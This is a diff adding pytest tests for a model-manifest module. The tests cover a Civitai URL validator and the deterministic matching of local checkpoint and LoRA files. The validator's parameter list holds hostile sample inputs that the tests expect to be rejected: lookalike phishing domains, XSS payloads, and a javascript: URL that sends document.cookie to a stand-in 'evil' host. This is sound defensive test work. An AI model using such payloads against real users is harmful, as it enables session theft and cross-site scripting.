@@ -374,3 +374,59 @@ def test_read_manifest_rejects_deeply_nested_json():
     with pytest.raises(manifest.ManifestError) as ei:
         manifest._read_manifest(body)
     assert ei.value.reason == "bad_json"
+
+
+@pytest.mark.parametrize("url,ok", [
+    ("https://civitai.com/models/1?modelVersionId=2", True),
+    ("https://civitai.com/", True),
+    ("http://civitai.com/models/1", False),            # 非 https
+    ("https://civitai.com.evil.tld/x", False),         # 仿冒域
+    ("https://civitai-com.evil.tld/x", False),
+    ("https://evil.tld/civitai.com", False),
+    ("javascript:fetch('http://evil/'+document.cookie)", False),   # 会在本地 origin 执行
+    ("JavaScript:alert(1)", False),
+    ("data:text/html,<script>alert(1)</script>", False),
+    ("", False), (None, False), (123, False), ({"u": "x"}, False),
+])
+def test_safe_civitai_url(url, ok):
+    # bundle 来自他人,civitai.url 完全可控;前端会把它渲染成用户被诱导点击的链接 [B1]
+    assert (manifest._safe_civitai_url(url) is not None) is ok
+
+
+def test_candidates_name_fallback_is_scoped_by_dir_type(tmp_path):
+    # manifest 要 checkpoints/foo,本地只有毫不相干的 loras/foo → 必须无候选 [H1]
+    c = _conn(tmp_path)
+    mr = _root(c, "/m")
+    _model(c, mr, "loras", "foo.safetensors", sha256="b" * 64)
+    c.commit()
+    assert manifest._candidates(
+        c, {"ref_string": "foo.safetensors", "filename": "foo.safetensors",
+            "dir_type": "checkpoints"}) == []
+    # dir_type 为 null(未知 loader)时才允许裸 name_key 兜底 [L11]
+    assert len(manifest._candidates(
+        c, {"ref_string": "foo.safetensors", "filename": "foo.safetensors",
+            "dir_type": None})) == 1
+
+
+def test_candidates_prefers_path_over_name_and_is_deterministic(tmp_path):
+    c = _conn(tmp_path)
+    mr = _root(c, "/m")
+    exact_path = _model(c, mr, "loras", "sub/foo.safetensors", sha256="a" * 64)
+    _model(c, mr, "loras", "foo.safetensors", sha256="b" * 64)
+    c.commit()
+    # match_key 命中即不再退 name_key(与 resolver._match 同优先级)
+    rows = manifest._candidates(
+        c, {"ref_string": "sub/foo.safetensors", "filename": "foo.safetensors", "dir_type": "loras"})
+    assert [r["id"] for r in rows] == [exact_path]
+
+
+def test_candidates_multi_root_same_relpath_returns_all_in_stable_order(tmp_path):
+    c = _conn(tmp_path)
+    m2 = _model(c, _root(c, "/m2"), "checkpoints", "SD1.5/foo.safetensors", sha256="z" * 64)
+    m1 = _model(c, _root(c, "/m1"), "checkpoints", "SD1.5/foo.safetensors", sha256="y" * 64)
+    c.commit()
+    entry = {"ref_string": "SD1.5/foo.safetensors", "filename": "foo.safetensors",
+             "dir_type": "checkpoints"}
+    ids = [r["id"] for r in manifest._candidates(c, entry)]
+    assert sorted(ids) == sorted([m1, m2])
+    assert ids == [r["id"] for r in manifest._candidates(c, entry)]   # 确定性:两次同序 [H2]
